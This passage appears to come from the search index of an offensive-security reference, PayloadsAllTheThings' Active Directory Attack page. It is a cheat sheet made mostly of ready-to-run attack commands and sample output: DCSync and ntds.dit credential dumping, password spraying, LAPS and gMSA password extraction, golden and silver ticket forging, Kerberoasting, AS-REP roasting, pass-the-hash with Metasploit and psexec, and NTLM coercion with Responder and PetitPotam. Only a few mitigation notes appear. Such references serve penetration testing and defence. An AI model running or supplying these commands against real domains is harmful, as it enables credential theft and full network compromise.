disabled.","title":"Extract hashes from ntds.dit"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#alternatives-modules","text":"Metasploit modules windows/gather/credentials/domain_hashdump PowerSploit module Invoke-NinjaCopy --path c:\\windows\\NTDS\\ntds.dit --verbose --localdestination c:\\ntds.dit CrackMapExec module cme smb 10.10.0.202 -u username -p password --ntds vss cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default","title":"Alternatives - modules"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-mimikatz-dcsync","text":"Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. # DCSync only one user mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt # DCSync all users of the domain mimikatz# lsadump::dcsync /domain:htb.local /all /csv :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.","title":"Using Mimikatz DCSync"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-mimikatz-sekurlsa","text":"Dumps credential data in an Active Directory domain when run on a Domain Controller. :warning: Requires administrator access with debug or Local SYSTEM rights sekurlsa::krbtgt lsadump::lsa /inject /name:krbtgt","title":"Using Mimikatz sekurlsa"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#crack-ntlm-hashes-with-hashcat","text":"Useful when you want to have the clear text password or when you need to make stats about weak passwords. Recommended wordlists: - Rockyou.txt - Have I Been Pwned founds - Weakpass.com - Read More at Methodology and Resources/Hash Cracking.md # Basic wordlist # (-O) will Optimize for 32 characters or less passwords # (-w 4) will set the workload to \"Insane\" $ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2 # Generate a custom mask based on a wordlist $ git clone https://github.com/iphelix/pack/blob/master/README $ python2 statsgen.py ../hashcat.potfile -o hashcat.mask $ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask :warning: If the password is not a confidential data (challenges/ctf), you can use online \"cracker\" like : - hashmob.net - crackstation.net - hashes.com","title":"Crack NTLM hashes with hashcat"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#user-hunting","text":"Sometimes you need to find a machine where a specific user is logged in. You can remotely query every machines on the network to get a list of the users's sessions. CrackMapExec ps1 cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG [+] Enumerated sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG \\\\10.10.10.10 User:Administrator Impacket Smbclient ps1 $ impacket-smbclient Administrator@10.10.10.10 # who host: \\\\10.10.10.10, user: Administrator, active: 1, idle: 0 PowerView Invoke-UserHunter ps1 # Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \"RDPUsers\" Invoke-UserHunter -Stealth","title":"User Hunting"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#password-spraying","text":"Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. Most of the time the best passwords to spray are : P@ssw0rd01 , Password123 , Password1 , Hello123 , mimikatz Welcome1 / Welcome01 $Companyname1 : $Microsoft1 SeasonYear : Winter2019* , Spring2020! , Summer2018? , Summer2020 , July2020! Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#) Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)","title":"Password spraying"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-pre-auth-bruteforcing","text":"Using kerbrute , a tool to perform Kerberos pre-auth bruteforcing. Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625) , but rather with specific logs to Kerberos pre-authentication failure (4771) . Username bruteforce powershell root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt Password bruteforce powershell root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username Password spray powershell root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log","title":"Kerberos pre-auth bruteforcing"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spray-a-pre-generated-passwords-list","text":"Using crackmapexec and mp64 to generate passwords and spray them against SMB services on the network. powershell crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)` Using DomainPasswordSpray to spray a password against all users of a domain. powershell # https://github.com/dafthack/DomainPasswordSpray Invoke-DomainPasswordSpray -Password Summer2021! # /!\\ be careful with the account lockout ! Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt Using SMBAutoBrute . powershell Invoke-SMBAutoBrute -UserList \"C:\\ProgramData\\admins.txt\" -PasswordList \"Password1, Welcome1, 1qazXDR%+\" -LockoutThreshold 5 -ShowVerbose","title":"Spray a pre-generated passwords list"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spray-passwords-against-the-rdp-service","text":"Using RDPassSpray to target RDP services. powershell git clone https://github.com/xFreed0m/RDPassSpray python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP] Using hydra and ncrack to target RDP services. powershell hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 ncrack \u2013connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10","title":"Spray passwords against the RDP service"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#badpwdcount-attribute","text":"The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown. $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users LDAP 10.0.2.11 389 dc01 Guest badpwdcount: 0 pwdLastSet: <never> LDAP 10.0.2.11 389 dc01 krbtgt badpwdcount: 0 pwdLastSet: <never>","title":"BadPwdCount attribute"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#password-in-ad-user-comment","text":"$ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users GET-DESC... 10.0.2.11 389 dc01 [+] Found following users: GET-DESC... 10.0.2.11 389 dc01 User: Guest description: Built-in account for guest access to the computer/domain GET-DESC... 10.0.2.11 389 dc01 User: krbtgt description: Key Distribution Center Service Account There are 3-4 fields that seem to be common in most AD schemas: UserPassword , UnixUserPassword , unicodePwd and msSFU30Password . enum4linux | grep -i desc Get-WmiObject -Class Win32_UserAccount -Filter \"Domain='COMPANYDOMAIN' AND Disabled='False'\" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID or dump the Active Directory and grep the content. ldapdomaindump -u 'DOMAIN\\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/","title":"Password in AD User comment"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#password-of-pre-created-computer-account","text":"When Assign this computer account as a pre-Windows 2000 computer checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo . # Create a machine with default password # must be run from a domain joined device connected to the domain djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc When you attempt to login using the credential you should have the following error code : STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT . Then you need to change the password with rpcchangepwd.py","title":"Password of Pre-Created Computer Account"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#reading-laps-password","text":"Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure.","title":"Reading LAPS Password"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#determine-if-laps-is-installed","text":"Get-ChildItem 'c:\\program files\\LAPS\\CSE\\Admpwd.dll' Get-FileHash 'c:\\program files\\LAPS\\CSE\\Admpwd.dll' Get-AuthenticodeSignature 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'","title":"Determine if LAPS is installed"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-laps-password","text":"The \"ms-mcs-AdmPwd\" a \"confidential\" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users From Windows: adsisearcher (native binary on Windows 8+) powershell ([adsisearcher]\"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\").findAll() | ForEach-Object { $_.properties} ([adsisearcher]\"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\").findAll() | ForEach-Object { $_.properties} PowerView powershell PS > Import-Module .\\PowerView.ps1 PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime LAPSToolkit ```powershell $ Get-LAPSComputers ComputerName Password Expiration ------------ -------- ---------- example.domain.local dbZu7;vGaI)Y6w1L 02/21/2021 22:29:18 $ Find-LAPSDelegatedGroups $ Find-AdmPwdExtendedRights ``` Powershell AdmPwd.PS powershell foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}} From Linux: pyLAPS to read and write LAPS passwords: bash # Read the password of all computers ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1 # Write a random password to a specific computer ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1 CrackMapExec : bash crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps LAPSDumper bash python laps.py -u 'user' -p 'password' -d 'domain.local' python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local' ldapsearch bash ldapsearch -x -h -D \"@\" -w -b \"dc=<>,dc=<>,dc=<>\" \"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))\" ms-MCS-AdmPwd`","title":"Extract LAPS password"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#grant-laps-access","text":"The members of the group \"Account Operator\" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain \"domain.local\" Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain \"domain.local\"","title":"Grant LAPS Access"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#reading-gmsa-password","text":"User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.","title":"Reading GMSA Password"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#gmsa-attributes-in-the-active-directory","text":"msDS-GroupMSAMembership ( PrincipalsAllowedToRetrieveManagedPassword ) - stores the security principals that can access the GMSA password. msds-ManagedPassword - This attribute contains a BLOB with password information for group-managed service accounts. msDS-ManagedPasswordId - This constructed attribute contains the key identifier for the current managed password data for a group MSA. msDS-ManagedPasswordInterval - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.","title":"GMSA Attributes in the Active Directory"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-nt-hash-from-the-active-directory","text":"GMSAPasswordReader (C#) ps1 # https://github.com/rvazarkar/GMSAPasswordReader GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT gMSADumper (Python) powershell # https://github.com/micahvandeusen/gMSADumper python3 gMSADumper.py -u User -p Password1 -d domain.local Active Directory Powershell ps1 $gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword' $blob = $gmsa.'msDS-ManagedPassword' $mp = ConvertFrom-ADManagedPasswordBlob $blob $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module","title":"Extract NT hash from the Active Directory"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#forging-golden-gmsa","text":"One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it. Using GoldenGMSA ```ps1 # Enumerate all gMSAs GoldenGMSA.exe gmsainfo # Query for a specific gMSA GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112","title":"Forging Golden GMSA"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dump-all-kds-root-keys","text":"GoldenGMSA.exe kdsinfo","title":"Dump all KDS Root Keys"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dump-a-specific-kds-root-key","text":"GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb","title":"Dump a specific KDS Root Key"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#compute-gmsa-password","text":"","title":"Compute gMSA password"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#-sid-sid-of-the-gmsa-required","text":"","title":"--sid : SID of the gMSA (required)"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#-kdskey-base64-encoded-kds-root-key","text":"","title":"--kdskey : Base64 encoded KDS Root Key"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#-pwdid-base64-of-msds-managedpasswordid-attribute-value","text":"GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode ```","title":"--pwdid : Base64 of msds-ManagedPasswordID attribute value"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-ticket-golden-tickets","text":"Forging a TGT require the krbtgt NTLM hash The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.","title":"Pass-the-Ticket Golden Tickets"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-mimikatz","text":"# Get info - Mimikatz lsadump::lsa /inject /name:krbtgt lsadump::lsa /patch lsadump::trust /patch lsadump::dcsync /user:krbtgt # Forge a Golden ticket - Mimikatz kerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt","title":"Using Mimikatz"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-meterpreter","text":"# Get info - Meterpreter(kiwi) dcsync_ntlm krbtgt dcsync krbtgt # Forge a Golden ticket - Meterpreter load kiwi golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck> golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck kerberos_ticket_purge kerberos_ticket_use /root/Downloads/pentestlabuser.tck kerberos_ticket_list","title":"Using Meterpreter"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-a-ticket-on-linux","text":"# Convert the ticket kirbi to ccache with kekeo misc::convert ccache ticket.kirbi # Alternatively you can use ticketer from Impacket ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519 export KRB5CCNAME=/home/user/ticket.ccache cat $KRB5CCNAME # NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo . root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi Converting ccache => kirbi root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache Converting kirbi => ccache Mitigations: * Hard to detect because they are legit TGT tickets * Mimikatz generate a golden ticket with a life-span of 10 years","title":"Using a ticket on Linux"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-ticket-silver-tickets","text":"Forging a TGS require machine account password (key) or NTLM hash of the service account. # Create a ticket for the service mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE # Examples mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park # Then use the same steps as a Golden ticket mimikatz $ misc::convert ccache ticket.kirbi root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 Interesting services to target with a silver ticket : Service Type Service Silver Tickets Attack WMI HOST + RPCSS wmic.exe /authority:\"kerberos:DOMAIN\\DC01\" /node:\"DC01\" process call create \"cmd /c evil.exe\" PowerShell Remoting CIFS + HTTP + (wsman?) New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC WinRM HTTP + wsman New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC Scheduled Tasks HOST schtasks /create /s dc01 /SC WEEKLY /RU \"NT Authority\\System\" /IN \"SCOM Agent Health Check\" /IR \"C:/shell.ps1\" Windows File Share (CIFS) CIFS dir \\\\dc01\\c$ LDAP operations including Mimikatz DCSync LDAP lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt Windows Remote Server Administration Tools RPCSS + LDAP + CIFS / Mitigations: * Set the attribute \"Account is Sensitive and Cannot be Delegated\" to prevent lateral movement with the generated ticket.","title":"Pass-the-Ticket Silver Tickets"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberoasting","text":"\"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \" - MSDN Any valid domain user can request a kerberos ticket (TGS) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. GetUserSPNs from Impacket Suite ```powershell $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-12-03 17:11:11 $krb5tgs$23$ Administrator$ACTIVE.HTB$active/CIFS~445 $424338c0a3c3af43[...]84fd2 ``` CrackMapExec Module powershell $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt LDAP 10.0.2.11 389 dc01 [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False) LDAP 10.0.2.11 389 dc01 $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9 Rubeus ```powershell # Stats Rubeus.exe kerberoast /stats ------------------------------------- ---------------------------------- | Supported Encryption Type | Count | | Password Last Set Year | Count | | RC4_HMAC_DEFAULT | 1 | | 2021 | 1 | # Kerberoast (RC4 ticket) Rubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (AES ticket) # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested. Rubeus.exe kerberoast /tgtdeleg # Kerberoast (RC4 ticket) # The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted. Rubeus.exe kerberoast /rc4opsec ``` PowerView powershell Request-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\" bifrost on macOS machine powershell ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true targetedKerberoast powershell # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), # print the \"kerberoast\" hash, and delete the temporary SPN set for that operation targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key] Then crack the ticket using the correct hashcat mode ( $krb5tgs$23 = etype 23 ) Mode Description 13100 Kerberos 5 TGS-REP etype 23 (RC4) 19600 Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) 19700 Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt Mitigations: * Have a very long password for your accounts with SPNs (> 32 characters) * Make sure no users have SPNs","title":"Kerberoasting"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#krb_as_rep-roasting","text":"If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting Requirements : - Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose ) Rubeus ```powershell C:\\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast [ ] Action: AS-REP roasting [ ] Target User : TestOU3user [ ] Target Domain : testlab.local [ ] SamAccountName : TestOU3user [ ] DistinguishedName : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local [ ] Using domain controller: testlab.local (192.168.52.100) [ ] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user' [ ] Connecting to 192.168.52.100:88 [ ] Sent 169 bytes [ ] Received 1437 bytes [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)... ``` GetNPUsers from Impacket Suite ```powershell $ python GetNPUsers.py htb.local/svc-alfresco -no-pass [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4 # extract hashes root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast ``` CrackMapExec Module powershell $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt LDAP 10.0.2.11 389 dc01 $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5 Using hashcat or john to crack the ticket. # crack AS_REP messages with hashcat root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\\wordlists\\rockyou.txt # crack AS_REP messages with john C:\\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast Mitigations : * All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default).","title":"KRB_AS_REP Roasting"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-hash","text":"The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren\u2019t the built-in RID 500. Metasploit powershell use exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser jarrieta set SMBPass nastyCutt3r # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack. # NOTE2: Require the full NTLM hash, you may need to add the \"blank\" LM (aad3b435b51404eeaad3b435b51404ee) set PAYLOAD windows/meterpreter/bind_tcp run shell CrackMapExec powershell cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x \"whoami\" Impacket suite powershell proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d Windows RDP and mimikatz powershell sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:\"mstsc.exe /restrictedadmin\" You can extract the local SAM database to find the local administrator hash : C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save C:\\> reg.exe save hklm\\security c:\\temp\\security.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL","title":"Pass-the-Hash"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#overpass-the-hash-pass-the-key","text":"In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).","title":"OverPass-the-Hash (pass the key)"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-impacket","text":"root@kali:~$ python ./getTGT.py -hashes \":1a59bd44fe5bec39c44c8cd3524dee\" lab.ropnop.com root@kali:~$ export KRB5CCNAME=\"/root/impacket-examples/velociraptor.ccache\" root@kali:~$ python3 psexec.py \"jurassic.park/velociraptor@labwws02.jurassic.park\" -k -no-pass # also with the AES Key if you have it root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5 root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM root@kali:~$ klist","title":"Using impacket"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-rubeus","text":"# Request a TGT as the target user and pass it into the current session # NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt # More stealthy variant, but requires the AES256 hash .\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation) .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe","title":"Using Rubeus"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#capturing-and-cracking-net-ntlmv1ntlmv1-hashes","text":"Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. :information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication . This uses the outdated encryption method DES to protect the NT/LM Hashes. Requirements : * LmCompatibilityLevel = 0x1: Send LM & NTLM ( reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel ) Exploitation : * Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge ps1 HTTPS = On DNS = On LDAP = On ... ; Custom challenge. ; Use \"Random\" for generating a random challenge for each requests (Default) Challenge = 1122334455667788 * Fire Responder: responder -I eth0 --lm , if --disable-ess is set, extended session security will be disabled for NTLMv1 authentication * Force a callback: ps1 PetitPotam.exe Responder-IP DC-IP # Patched around August 2021 PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users * If you got some NTLMv1 hashes , you need to format them to submit them on crack.sh ps1 username::hostname:response:response:challenge -> NTHASH:response 